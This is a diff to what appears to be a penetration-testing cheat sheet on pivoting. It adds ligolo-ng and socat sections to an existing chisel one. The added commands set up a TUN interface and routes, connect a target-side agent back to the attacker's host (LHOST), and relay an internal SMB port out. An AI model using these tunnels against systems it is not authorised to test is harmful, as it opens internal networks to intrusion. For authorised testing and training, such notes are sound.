@@ -24,6 +24,27 @@ pwnloop x "/opt/static/chisel_1.10.1_linux_arm64 server -p 9000 --reverse" &
 ./chisel client LHOST:9000 R:8080:127.0.0.1:8080   # single port
 ```
 
+## ligolo-ng (cleanest when you can add a route)
+
+A TUN interface instead of a SOCKS proxy — so `nmap -sS`, UDP and raw tools work
+through it, unlike proxychains. Stage the agent like chisel.
+
+```bash
+# attacker: create the interface once, then start the proxy
+pwnloop x "ip tuntap add user root mode tun ligolo; ip link set ligolo up"
+pwnloop x "ip route add 10.10.20.0/24 dev ligolo"
+pwnloop x "/opt/static/ligolo-proxy -selfcert" &
+# target: connect back; then 'start' the tunnel/session in the proxy console
+./agent -connect LHOST:11601 -ignore-cert
+```
+
+## socat relay (single port, no framework)
+
+```bash
+# on the target: forward its view of an internal host:port back out to you
+./socat TCP-LISTEN:9001,fork,reuseaddr TCP:10.10.20.5:445
+```
+
 ## Using the proxy
 
 ```bash
